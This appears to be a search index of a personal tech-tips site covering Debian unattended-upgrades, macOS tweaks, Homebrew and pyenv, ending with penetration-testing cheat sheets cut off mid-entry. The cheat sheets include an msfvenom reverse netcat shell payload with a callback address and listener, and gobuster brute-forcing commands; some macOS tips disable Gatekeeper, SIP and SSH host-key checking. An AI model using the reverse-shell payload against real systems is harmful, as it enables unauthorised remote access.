\"auto\";\nUnattended-Upgrade::AutoFixInterruptedDpkg \"true\";\nUnattended-Upgrade::MinimalSteps \"true\";\nUnattended-Upgrade::InstallOnShutdown \"false\";\n//Unattended-Upgrade::Mail \"\";\n//Unattended-Upgrade::MailReport \"on-change\";\nUnattended-Upgrade::Remove-Unused-Kernel-Packages \"true\";\nUnattended-Upgrade::Remove-New-Unused-Dependencies \"true\";\nUnattended-Upgrade::Remove-Unused-Dependencies \"true\";\nUnattended-Upgrade::Automatic-Reboot \"true\";\nUnattended-Upgrade::Automatic-Reboot-WithUsers \"true\";\nUnattended-Upgrade::Automatic-Reboot-Time \"06:00\";\n//Acquire::http::Dl-Limit \"70\";\n// Unattended-Upgrade::SyslogEnable \"false\";\n// Unattended-Upgrade::SyslogFacility \"daemon\";\n// Unattended-Upgrade::OnlyOnACPower \"true\";\n// Unattended-Upgrade::Skip-Updates-On-Metered-Connections \"true\";\n// Unattended-Upgrade::Verbose \"false\";\n// Unattended-Upgrade::Debug \"false\";\n// Unattended-Upgrade::Allow-downgrade \"false\";\n</code></pre> <pre><code>Unattended-Upgrade::Origins-Pattern {\n// Codename based matching:\n// This will follow the migration of a release through different\n// archives (e.g. from testing to stable and later oldstable).\n// Software will be the latest available for the named release,\n// but the Debian release itself will not be automatically upgraded.\n\"origin=Debian,codename=${distro_codename}-updates\";\n// \"origin=Debian,codename=${distro_codename}-proposed-updates\";\n\"origin=Debian,codename=${distro_codename},label=Debian\";\n\"origin=Debian,codename=${distro_codename},label=Debian-Security\";\n\n// Archive or Suite based matching:\n// Note that this will silently match a different release after\n// migration to the specified archive (e.g. testing becomes the\n// new stable).\n// \"o=Debian,a=stable\";\n// \"o=Debian,a=stable-updates\";\n// \"o=Debian,a=proposed-updates\";\n// \"o=Debian Backports,a=${distro_codename}-backports,l=Debian Backports\";\n};\n\nUnattended-Upgrade::DevRelease \"auto\";\nUnattended-Upgrade::AutoFixInterruptedDpkg \"true\";\nUnattended-Upgrade::MinimalSteps \"true\";\nUnattended-Upgrade::InstallOnShutdown \"false\";\n//Unattended-Upgrade::Mail \"\";\n//Unattended-Upgrade::MailReport \"on-change\";\nUnattended-Upgrade::Remove-Unused-Kernel-Packages \"true\";\nUnattended-Upgrade::Remove-New-Unused-Dependencies \"true\";\nUnattended-Upgrade::Remove-Unused-Dependencies \"true\";\nUnattended-Upgrade::Automatic-Reboot \"true\";\nUnattended-Upgrade::Automatic-Reboot-WithUsers \"true\";\nUnattended-Upgrade::Automatic-Reboot-Time \"06:00\";\n// Acquire::http::Dl-Limit \"70\";\n// Unattended-Upgrade::SyslogEnable \"false\";\n// Unattended-Upgrade::SyslogFacility \"daemon\";\n// Unattended-Upgrade::OnlyOnACPower \"true\";\n// Unattended-Upgrade::Skip-Updates-On-Metered-Connections \"true\";\n// Unattended-Upgrade::Verbose \"false\";\n// Unattended-Upgrade::Debug \"false\";\n// Unattended-Upgrade::Allow-downgrade \"false\";\n</code></pre> <p>Automatic call via /etc/apt/apt.conf.d/20auto-upgrades</p> <pre><code>echo unattended-upgrades unattended-upgrades/enable_auto_updates boolean true | sudo debconf-set-selections\nsudo dpkg-reconfigure -f noninteractive unattended-upgrades\n</code></pre> <p>Check the /etc/apt/apt.conf.d/20auto-upgrades for those 2 lines:</p> <pre><code>APT::Periodic::Update-Package-Lists \"1\";\nAPT::Periodic::Unattended-Upgrade \"1\";\n</code></pre> <p>Manual Run:</p> <pre><code>sudo unattended-upgrade -d\n</code></pre> <p>To enable unattended-upgrade use the following command:</p> <pre><code>sudo dpkg-reconfigure --priority=low unattended-upgrades\n</code></pre>", "tags": ["ubuntu"]}, {"location": "mac-os/applications-tweaks/", "title": "Applications Tweaks", "text": "", "tags": ["macOS"]}, {"location": "mac-os/applications-tweaks/#running-multi-instances-of-an-application", "title": "Running Multi Instances of an Application", "text": "<p>Launch the Script Editor choose temporary folder</p> <p>Copy the command to be executed to the Script Editor</p> <pre><code>do shell script \"open -n &lt;path to application&gt;\"\n</code></pre> <p>Example</p> <p>do shell script \"open -n /Applications/'Visual Studio Code.app'\"</p> <p>File &gt; Export</p> <p>Use the following settings:</p> <ul> <li>Export As: Your New Application Name</li> <li>Where: Applications</li> <li>File Format: Application</li> </ul> <p>Change The Icon of Your New Application:</p> <p>In Finder got to Applications folder. Right Click on the new Your New Application application we just created and click Get Info. Drug the original application icon (or any other) to the in the left corner of the \"get info\" menu.</p>", "tags": ["macOS"]}, {"location": "mac-os/applications-tweaks/#lunch-firefox-profile-manager-as-application", "title": "Lunch Firefox Profile Manager as Application", "text": "<p>Launch the Script Editor choose temporary folder</p> <p>Copy the command to be executed to the Script Editor</p> <pre><code>do shell script \"/Applications/Firefox.app/Contents/MacOS/firefox -ProfileManager &amp;&gt; /dev/null &amp;\"\n</code></pre> <p>File &gt; Export</p> <p>Use the following settings:</p> <ul> <li>Save As: Firefox Profile Manager</li> <li>Where: Applications</li> <li>File Format: Application</li> </ul> <p>Change The Icon of Your New Firefox Profile Manager Application:</p> <p>In Finder got to Applications folder. Right Click on the new Firefox Profile Manager application we just created and click Get Info. Drug the original application to the icon in the left corner of the \"get info\" menu.</p>", "tags": ["macOS"]}, {"location": "mac-os/enable-root-user/", "title": "Enable or Disable the Root User on macOS", "text": "<p>Mac administrators can use the root user account to perform tasks that require access to more areas of the system.</p> <p>The user account named \u201droot\u201d is a superuser with read and write privileges to more areas of the system, including files in other macOS user accounts. The root user is disabled by default. If you can log in to your Mac with an administrator account, you can enable the root user, then log in as the root user to complete your task.</p>", "tags": ["macOS"]}, {"location": "mac-os/enable-root-user/#how-to-enable-the-root-user", "title": "How to Enable the Root User", "text": "<p><code>System Preferences</code> &gt; <code>Users &amp; Groups</code> Click <code>lock</code> icon, enter an administrator name and password. Click <code>Login Options</code>. Click <code>Join</code> at <code>Newotk Account Server</code>.</p> <p></p> <p>Click <code>Open Directory Utility</code>.</p> <p></p> <p>Click lock icon in the Directory Utility window, then enter an administrator name and password.</p> <p>From the menu bar in Directory Utility: Choose Edit &gt; Enable Root User, then enter the password that you want to use for the root user. Or choose Edit &gt; Disable Root User.</p> <p></p>", "tags": ["macOS"]}, {"location": "mac-os/enable-root-user/#how-to-disable-the-root-user", "title": "How to Disable the Root User", "text": "<p>To Disable the Root User repeat the steps above, but change the last step to Disable Root User.</p>", "tags": ["macOS"]}, {"location": "mac-os/enable-root-user/#login-as-the-root-user", "title": "Login as The Root User", "text": "<p>When the root user is enabled, you have the privileges of the root user only while logged in as the root user.</p> <p>Logout of your current account, then log in as the root user. user name \u201droot\u201d and the password you created for the root user.</p>", "tags": ["macOS"]}, {"location": "mac-os/import-ssh-keys-keychain/", "title": "Import ed25519/RSA Keys Passphrase to macOS Keychain", "text": "<p>First, you need to add the keys to the <code>keychain</code> with the following steps:</p> <p>Copy your <code>ed25519, ed25519.pub</code> / <code>id_rsa, id_rsa.pub</code> to <code>~/.ssh/</code> folder</p> <p>Store the key in the MacOS Keychain</p> ed25519 KeyRSA Key <pre><code>ssh-add --apple-use-keychain ~/.ssh/ed25519\n</code></pre> <pre><code>ssh-add --apple-use-keychain ~/.ssh/id_rsa\n</code></pre> <p>Enter your key passphrase. You won't be asked for it again.</p> <p>List all keys in the keychain:</p> <pre><code>ssh-add -l\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/import-ssh-keys-keychain/#configure-ssh-to-always-use-the-keychain", "title": "Configure SSH to always use the keychain", "text": "<p>If you haven't already, create an <code>~/.ssh/config</code> file. In other words, in the .ssh directory in your home dir, make a file called config.</p> <p>At <code>~/.ssh/config</code> file, add the following lines at the top of the config:</p> <p>Store the key in the MacOS Keychain</p> For ed25519 KeyFor RSA Key <pre><code>Host *\n  UseKeychain yes\n  AddKeysToAgent yes\n  IdentityFile ~/.ssh/id_ed25519\n</code></pre> <pre><code>Host *\n  UseKeychain yes\n  AddKeysToAgent yes\n  IdentityFile ~/.ssh/id_rsa\n</code></pre> <p>The UseKeychain yes is the key part, which tells SSH to look in your macOS keychain for the key passphrase.</p> <p>That's it! Next time you load any ssh connection, it will try the private keys you've specified, and it will look for their passphrase in the macOS keychain. No passphrase typing required.</p>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/", "title": "Terminal Snippets", "text": "<p>Terminal usage snippets for macOS. This is a collection of snippets that I use without specific category.</p>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#install-macos-updates-via-cli", "title": "Install macOS Updates via CLI", "text": "<pre><code>softwareupdate -i -a\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#install-command-line-tools", "title": "Install Command Line Tools", "text": "<pre><code>xcode-select --install\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#shell-safe-rm", "title": "Shell Safe rm", "text": "<p>Source shell-safe-rm github</p> <p>A much safer replacement of shell <code>rm</code> with ALMOST FULL features of the origin <code>rm</code> command.</p> <p>Initially developed on Mac OS X, then tested on Linux.</p> <p>Using <code>safe-rm</code>, the files or directories you choose to remove will move to <code>$HOME/.Trash</code> instead of simply deleting them. You could put them back whenever you want manually.</p> <p>If a file or directory with the same name already exists in the Trash, the name of newly-deleted items will be ended with the current date and time.</p> <p>Install with npm:</p> <pre><code>npm i -g safe-rm\n</code></pre> <p>Add Alias to your zshrc config</p> <pre><code>alias rm='safe-rm'\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#disable-stricthostkeychecking-in-ssh", "title": "Disable StrictHostKeyChecking in SSH", "text": "<p>To disable strict host checking on OS X for the current user, create or edit <code>~/.ssh/ssh_config</code> and add the following lines:</p> <pre><code>StrictHostKeyChecking no\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#set-macos-hostname-via-cli", "title": "Set macOS Hostname via CLI", "text": "<pre><code>sudo scutil --set HostName &lt;NewHostNameHere&gt;\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#syntax-highlighting-for-nano", "title": "Syntax Highlighting for Nano", "text": "<p>Install Nano from homebrew Create <code>~/.nanorc</code> file with the syntax below</p> <pre><code>brew install nano\ntouch ~/.nanorc\n</code></pre> <p>Edit <code>~/.nanorc</code> file with the syntax below</p> M1 (ARM)Intel Based <pre><code>echo 'include \"/opt/homebrew/share/nano/*.nanorc\"' &gt;&gt; ~/.nanorc\n</code></pre> <pre><code>echo 'include \"/usr/local/share/nano/*.nanorc\"' &gt;&gt; ~/.nanorc\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#disableenable-gatekeeper", "title": "Disable/Enable Gatekeeper", "text": "<p>Disable Gatekeeper</p> <pre><code>sudo spctl --master-disable\n</code></pre> <p>Enable Gatekeeper</p> <pre><code>sudo spctl --master-enable\n</code></pre> <p>Check Status</p> <pre><code>spctl --status\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#disableenable-sip-system-integrity-protection", "title": "Disable/Enable SIP (System Integrity Protection)", "text": "<p>Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo appears on your screen. Click Utilities &gt; Terminal. In the Terminal window, type in:</p> <p>Status:</p> <pre><code>csrutil status\n</code></pre> <p>Disable:</p> <pre><code>csrutil disable\n</code></pre> <p>Enable:</p> <pre><code>csrutil enable\n</code></pre> <p>Press Enter and restart your Mac.</p>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#installing-rbenv-ruby-send-box-ruby-alternative-to-the-one-that-macos-uses", "title": "Installing rbenv (ruby send box) - Ruby alternative to the one that macOS uses", "text": "<p>Install rbenv with brew</p> <pre><code>brew install rbenv\n</code></pre> <p>Add eval <code>\"$(rbenv init -)\"</code> to the end of <code>~/.zshrc</code> or <code>~/.bash_profile</code></p> <p>Install a ruby version</p> <pre><code>rbenv install 2.3.1\n</code></pre> <p>Select a ruby version by rbenv</p> <pre><code>rbenv global 2.3.1\n</code></pre> <p>Open a new terminal window</p> <p>Verify that the right gem folder is being used with <code>gem env home</code>(should report something in your user folder not system wide)</p>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#list-listening-ports-and-programs-and-users-netstat-like", "title": "List listening Ports and Programs and Users (netstat like)", "text": "<pre><code>sudo lsof -i -P | grep -i \"listen\"\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#disable-last-login-at-terminal", "title": "Disable \"last login\" at Terminal", "text": "<pre><code>cd ~/\ntouch .hushlogin\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#fix-missing-usersshared-folder", "title": "Fix Missing /Users/Shared Folder", "text": "<p>Create he missing /Users/Shared folder</p> <pre><code>sudo mkdir -p /Users/Shared/\n</code></pre> <p>Fix permissions for the /Users/Shared folder</p> <pre><code>sudo chmod -R 1777 /Users/Shared\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#iterm2", "title": "iTerm2", "text": "<p>Using Alt/Cmd + Right/Left Arrow in iTerm2</p> <p>Go to <code>iTerm Preferences</code> \u2192 <code>Profiles</code>, select your profile, then the <code>Keys</code> tab. click <code>Load Preset</code>... and choose <code>Natural Text Editing</code>.</p> <p>Remove the Right Arrow Before the Cursor Line</p> <p>you can turn it off by going in to <code>Preferences</code> &gt; <code>Profiles</code> &gt; (your profile) &gt; <code>Terminal</code>, scroll down to <code>Shell Integration</code>, and turn off <code>Show mark indicators</code>.</p>", "tags": ["macos"]}, {"location": "mac-os/terminal-snippets/#clear-google-drive-cache", "title": "Clear Google Drive cache", "text": "<pre><code>rm -rf ~/Library/Application\\ Support/Google/DriveFS/[0-9]*\n</code></pre>", "tags": ["macos"]}, {"location": "mac-os/touch-id-for-sudo/", "title": "TouchID for sudo", "text": "<p>Apple devices such Macbooks and some Apple Magic Keyboards have a fingerprint - Touch ID scanner that can be used to authenticate a user with a touch of a finger. This functionality isn't available when using <code>sudo</code> to run commands. You have to enter your password every time you run commands with high privileges.</p> <p>We can enable TouchID for sudo with a simple config change. This will allow you to use Touch ID to authenticate with <code>sudo</code> without entering your password including the authentication with Apple Watch.</p> <p>Display Link - Known Issue</p> <p>As of the writing of this article, the Display Link Driver will privent the use of Touch ID for sudo when using the Display link device. It will work when the Display Link device isn't connected. This is a known issue.</p>", "tags": ["macOS", "iTerm2", "terminal", "touchID"]}, {"location": "mac-os/touch-id-for-sudo/#enable-touchid-for-sudo", "title": "Enable TouchID for sudo", "text": "<p>Open in text editor file with sudo privileges <code>/etc/pam.d/sudo</code>. In the next example we will use the <code>nano</code> editor.</p> <pre><code>sudo nano /etc/pam.d/sudo\n</code></pre> <p>Add at the top of the config file this line:</p> <pre><code>auth       sufficient     pam_tid.so\n</code></pre> <p>Your config should look like this:</p> <p></p> <p>Save and Exit.</p> <p>You can test your TouchID prompt in terminal by opening new session and running:</p> <pre><code>sudo -l\n</code></pre>", "tags": ["macOS", "iTerm2", "terminal", "touchID"]}, {"location": "mac-os/touch-id-for-sudo/#enable-touchid-support-in-iterm2", "title": "Enable TouchID Support in iTerm2", "text": "<p>In order to enable TouchID support in iTerm2, you need to complete the above section and then follow the steps below:</p> <p>Go to <code>iTerm2</code> -&gt; <code>Preferences</code> -&gt; <code>Advanced</code> and search for:</p> <pre><code>Allow session to survive\n</code></pre> <p>Change Allow session to survive logging out and back in. to <code>No</code></p> <p></p> <p>You can test your TouchID prompt in iTerm2 by opening new session and running:</p> <pre><code>sudo -l\n</code></pre>", "tags": ["macOS", "iTerm2", "terminal", "touchID"]}, {"location": "mac-os/ui-tweaks/", "title": "UI Tweaks", "text": "", "tags": ["macOS"]}, {"location": "mac-os/ui-tweaks/#hide-all-the-icons-on-your-desktop", "title": "Hide All The Icons On Your Desktop", "text": "<p>Disable Icons:</p> <pre><code>defaults write com.apple.finder CreateDesktop false\nkillall Finder\n</code></pre> <p>Enable Icons:</p> <pre><code>defaults write com.apple.finder CreateDesktop true\nkillall Finder\n</code></pre>", "tags": ["macOS"]}, {"location": "mac-os/ui-tweaks/#change-the-launchpad-grid-layout", "title": "Change the Launchpad Grid Layout", "text": "<p>Change the springboard-columns and springboard-rows values according to your preference</p> <pre><code>defaults write com.apple.dock springboard-columns -int 8\ndefaults write com.apple.dock springboard-rows -int 6\ndefaults write com.apple.dock ResetLaunchPad -bool TRUE\nkillall Dock\n</code></pre>", "tags": ["macOS"]}, {"location": "mac-os/ui-tweaks/#reset-launchpad-icons-sort", "title": "Reset Launchpad Icons Sort", "text": "<pre><code>defaults write com.apple.dock ResetLaunchPad -bool true; killall Dock\n</code></pre>", "tags": ["macOS"]}, {"location": "mac-os/ui-tweaks/#set-the-same-view-options-for-all-finder-windows", "title": "Set the <code>Same View Options</code> for all Finder windows", "text": "<p>First, we want to set the default view options for all new Finder windows. To do so, open Finder and click on the view setting that you want to use. The settings are four icons and the top of your Finder window. If you don't see the Finder toolbar type:</p> <pre><code>cmd + option + t\n</code></pre> <p>After selecting the option you want, type:</p> <pre><code>cmd + j\n</code></pre> <p>to open the view options window.</p> <p>Make sure you check the top two checkboxes that say Always open in list view and Browse in list view. Keep in mind it will reflect whichever view you've selected.</p> <p>Now click the button at the bottom that says \"Use as Defaults\".</p>", "tags": ["macOS"]}, {"location": "mac-os/ui-tweaks/#delete-all-ds_store-files-on-your-computer", "title": "Delete all .DS_Store files on your computer", "text": "<p>Chances are you've opened some Finder windows in the past. Individual folder options will override this default setting that we just set.</p> <p>In order reset your folder settings across the entire machine we have to delete all .DS_Store files. This will ensure that all folders start fresh. Open up the Terminal application (Applications/Utilities/Terminal), and type:</p> <pre><code>sudo find / -name .DS_Store -delete 2&gt;/dev/null ; killall Finder\n</code></pre> <p><code>Note: In the future, whenever you switch views, it will automatically save in the new .DS_Store file. This will override the default settings.</code></p>", "tags": ["macOS"]}, {"location": "mac-os/homebrew/brewup/", "title": "BrewUp", "text": "", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#description", "title": "Description", "text": "<p>Brewup script is a Bash script that uses Homebrew - The Missing Package Manager for macOS as it's base. Brewup uses GitHub as a \"backup\" of a config file which contains all installed Taps, Formulas, Casks and App Store Apps at your macOS. It also allows the use of Github main function of retaining changes so you can always look up for the package that were installed sometime ago and you just forgot what is was exactly.</p> <p>Visit as at 3os.org for more guides and tips for macOS</p>", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#what-brewup-actually-does", "title": "What Brewup Actually Does", "text": "<p>It just runs few Brew functionality automatically:</p> <ul> <li>brew doctor</li> <li>brew missing</li> <li>brew upgrade</li> <li>brew cask upgrade</li> <li>brew cleanup</li> <li>App Store Updates</li> <li>Creating Updated Brewfile</li> <li>Pushing changes to Git</li> </ul>", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#requirements", "title": "Requirements", "text": "<ul> <li>Homebrew The missing package manager for macOS</li> <li>git (with active account)</li> <li>Mas, terminal-notifier, coreutils (will be installed if missing at the first script execution)</li> </ul>", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#installing", "title": "Installing", "text": "<p>Use this repository as template, it will create a <code>Fork</code> for you and you can start using it.</p> <pre><code>git clone &lt;paste the your repo url here&gt;\n</code></pre> <pre><code>sudo ln -s ${PWD}/BrewUp/brewup.sh /usr/local/bin/brewup\n</code></pre> <p>Note: if <code>/usr/local/bin/</code> is missing create it with</p> <pre><code>sudo mkdir /usr/local/bin/\n</code></pre>", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#usage", "title": "Usage", "text": "<p>just run from terminal:</p> <pre><code>brewup\n</code></pre> <p>Install all apps from BrewFile:</p> <p>cd to local location you cloned your repository and run:</p> <pre><code>brew bundle install --file=&lt;BrewFile Name&gt;\n</code></pre>", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#license", "title": "License", "text": "", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/brewup/#mit-license", "title": "MIT License", "text": "<p>Copyright \u00a9 Stas Kosatuhin @2019</p> <p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p> <p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p> <p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>", "tags": ["macos", "homebrew", "bash", "github"]}, {"location": "mac-os/homebrew/homebrew-snippets/", "title": "Brew Snippets", "text": "", "tags": ["macOS", "homebrew"]}, {"location": "mac-os/homebrew/homebrew-snippets/#brew-pinns-freez-and-unfreez-specific-packages", "title": "Brew Pinns - Freez and Unfreez Specific Packages", "text": "<p>This will alow you to pin (freez update) to specific packages to your Homebrew installation and then unfreeze them.</p> <p>List of packages that you freeze</p> <pre><code>brew list --pinned\n</code></pre> <p>Freeze Version</p> <pre><code>brew pin &lt;formula&gt;\n</code></pre> <p>Unfreeze Version</p> <pre><code>brew unpin &lt;formula&gt;\n</code></pre>", "tags": ["macOS", "homebrew"]}, {"location": "mac-os/homebrew/homebrew-snippets/#uninstall-brew-package-and-dependencies", "title": "Uninstall Brew Package and Dependencies", "text": "<p>Remove package's dependencies (does not remove package):</p> <pre><code>brew deps [FORMULA] | xargs brew remove --ignore-dependencies\n</code></pre> <p>Remove package:</p> <pre><code>brew remove [FORMULA]\n</code></pre> <p>Reinstall missing libraries:</p> <pre><code>brew missing | cut -d: -f2 | sort | uniq | xargs brew install\n</code></pre>", "tags": ["macOS", "homebrew"]}, {"location": "mac-os/python/pyenv-virtualenv/", "title": "Pyenv-virtualenv - Multiple Version Python Virtual Environment Manager", "text": "<p>For easy non-multiple version Python Virtual Environment follow this Venv Python Virtual Environment</p>", "tags": ["maco", "python"]}, {"location": "mac-os/python/pyenv-virtualenv/#intro", "title": "Intro", "text": "<p>Using and developing with Python on macOS sometimes may be frustrating...</p> <p>The reason for that is that macOS uses Python 2 for its core system with pip as a package manager. When Xcode Command Line Tools are installed Python 3 and pip3 package manager will be available at the cli. When using Python2, Python3 and their package managers this way, all the packages will be installed at the system level and my effect the native packages and their dependences , this can break or lead to unwanted bugs in OS.</p> <p>The right way to use python at macOS is to use Virtual Environments for python. This way all the system related versions of python and their packages won't be affected and use by you.</p>", "tags": ["maco", "python"]}, {"location": "mac-os/python/pyenv-virtualenv/#installing-and-configuring-pyenv-pyenv-virtualenv", "title": "Installing and configuring pyenv, pyenv-virtualenv", "text": "<p>In order to use pyenv, pyenv-virtualenv without conflicting with the native macOS python we need to add some configuration to our ~/.zshrc config (for mac os catalina) or your bash config if you are still using bash.</p> <p>It's very imported to maintain the order of the configuration for the loading order</p> <ul> <li>First of all we need to include your Executable Paths. In the example we added all the common paths, including the paths for pyenv, pyenv-virtualenv. If you have any other path that you use, you can add them at the same line or create a new line below this one.</li> <li>Second to Executable Paths we will add two if statements that will check if the pyenv,pyenv-virtualenv are installed, if they are it will load them. If they aren't and you are using the same zsh or bash config it will ignore loading them</li> <li>Third is a fix for brew, brew doctor. When using this method it may conflict with brew as it uses python as well. If you run run brew doctor without the fix, it will show config warnings related to the python configuration files.</li> </ul> <p>Configuration for ~/.zshrc or ~/.zprofile</p> <pre><code># Executable Paths\n## Global\nexport PATH=\"/usr/local/bin:/usr/local/sbin:/Users/${USER}/.local/bin:/usr/bin:/usr/sbin:/bin:/sbin:$PATH\"\n\n## Curl\nexport PATH=\"/opt/homebrew/opt/curl/bin:$PATH\"\nexport LDFLAGS=\"-L/opt/homebrew/opt/curl/lib\"\nexport CPPFLAGS=\"-I/opt/homebrew/opt/curl/include\"\nexport PKG_CONFIG_PATH=\"/opt/homebrew/opt/curl/lib/pkgconfig\"\n\n# pyenv, pyenv-virtualenv\n## Initiating pyenv and fix Brew Doctor: \"Warning: \"config\" scripts exist outside your system or Homebrew directories\"\nif which pyenv &gt;/dev/null; then\n  eval \"$(pyenv init --path)\"\n  alias brew='env PATH=${PATH//$(pyenv root)\\/shims:/} brew'\nfi\n\n## Initiating pyenv-virtualenv\nif which pyenv-virtualenv-init &gt;/dev/null; then\n  eval \"$(pyenv virtualenv-init -)\"\nfi\n</code></pre> <p>After you saved your configuration the best way to load it is to close your terminal session and open it again. This will load the session with your updated configuration. There should be no errors at the new session.</p> <p>This will install both pyenv and pyenv-virtualenv</p> <pre><code>brew install pyenv-virtualenv\n</code></pre> <p>Test if pyenv loaded currently</p> <pre><code>pyenv -v\n</code></pre> <p>After the installation we would like to set a system level python version, you can chose the default from the list available from the pyenv</p> <p>List available Python Version and find the version suited for your needs:</p> <pre><code>pyenv install --list\n</code></pre> <p>Install Requeued Python Version (Exmaple version 3.9.5) as a default system</p> <pre><code>pyenv install 3.9.5\n</code></pre> <p>Set it as global</p> <pre><code>pyenv global 3.9.5\n</code></pre> <p>You can install multiply versions of python at the same time.</p> <p>List all installed python versions and virtual environments and their python versions</p> <pre><code>pyenv versions\n</code></pre> <p>Now let's test our system Python version we set before, it should be the version you choose as Global before</p> <pre><code>python -V\n</code></pre> <p>So far we cleaned your system and installed and configured pyenv, pyenv-virtualenv.</p>", "tags": ["maco", "python"]}, {"location": "mac-os/python/pyenv-virtualenv/#how-to-use-pyenv-virtualenv", "title": "How to use pyenv-virtualenv", "text": "<p>Now let's understand how to use Python Virtual Environment with pyenv-virtualenv</p> <p>Full documentation can be found at the original repo at git hub: pyenv-virtualenv github</p> <p>We will list here some basic examples for a quick start and basic understanding</p> <p>To create a virtualenv for the Python version used with pyenv, run pyenv virtualenv, specifying the Python version you want and the name of the virtualenv directory. For example,</p> <pre><code>pyenv virtualenv 3.9.5 my-project-name\n</code></pre> <p>This will create a virtualenv based on Python 3.9.5 under $(pyenv root)/versions in a folder called my-project-name</p> <p>Activating virtualenv automatically for project</p> <p>The best way we found to activate the virtualenv at your project is to link the projects directory to the virtualenv.</p> <p>cd to the project's directory and link the virtualenv for example my-project-name virtualenv</p> <pre><code>pyenv local my-project-name\n</code></pre> <p>This will activate the linked virtualenv every time you cd to this directory automatically From now you can use pip to install any packages you need for your project, the location of the installed packages will be at $(pyenv root)/versions/ <p>Activating virtualenv manually for project</p> <p>You can also activate and deactivate a pyenv virtualenv manually:</p> <pre><code>pyenv activate &lt;virtualenv name&gt;\npyenv deactivate\n</code></pre> <p>This will alow you to use multiply versions of python or packages for the same project</p> <p>List existing virtualenvs</p> <pre><code>pyenv virtualenvs\n</code></pre> <p>Delete existing virtualenv</p> <pre><code>pyenv uninstall my-virtual-env\n</code></pre> <p>or</p> <pre><code>pyenv virtualenv-delete my-virtual-env\n</code></pre> <p>You and your macOS should be ready for using python the right way without conflicting any system or Xcode Command Line Tools (used by brew)</p>", "tags": ["maco", "python"]}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/", "title": "Cli Commands Collation", "text": "", "tags": ["pt", "penetration-testing", "cli", "commands", "collation"]}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#find-ptr-owner-reversal-look-up", "title": "Find PTR Owner - Reversal Look Up", "text": "<pre><code>dig 0.168.192.in-addr.arpa. NS\n</code></pre>", "tags": ["pt", "penetration-testing", "cli", "commands", "collation"]}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#listent-for-pingicmp-on-interface", "title": "Listent for Ping/icmp on interface", "text": "<pre><code>sudo tcpdump ip proto \\\\icmp -i eth0\n</code></pre>", "tags": ["pt", "penetration-testing", "cli", "commands", "collation"]}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#reverse-netcat-shell", "title": "Reverse Netcat Shell", "text": "<p>Payload R(row)</p> <pre><code>msfvenom -p cmd/unix/reverse_netcat lhost=10.11.19.49 lport=4444 R\n</code></pre> <p>listener:</p> <pre><code>nc -lvp 4444\n</code></pre>", "tags": ["pt", "penetration-testing", "cli", "commands", "collation"]}, {"location": "penetration-testing/cheatsheets/cli-commands-collation/#nfs-show-mount", "title": "NFS Show Mount", "text": "<pre><code>showmount -e 10.10.87.232\n</code></pre>", "tags": ["pt", "penetration-testing", "cli", "commands", "collation"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/", "title": "Gobuster CheatSheet", "text": "", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#common-gobuster-commands", "title": "Common Gobuster Commands", "text": "", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dir-mode", "title": "dir Mode", "text": "<pre><code>gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt\n</code></pre> <p>With content length</p> <pre><code>gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt -l\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/gobuster-cheatsheet/#dns-mode", "title": "dns Mode", "text": "<pre><code>gobuster dns -d example.com -t 50 -w common-names.txt\n</code></pre> <pre><code>gobuster dns -d example.com-w ~/wordlists/subdomains.txt\n</code></pre> <p>With Show IP</p> <pre><code>gobuster dns -d example.com 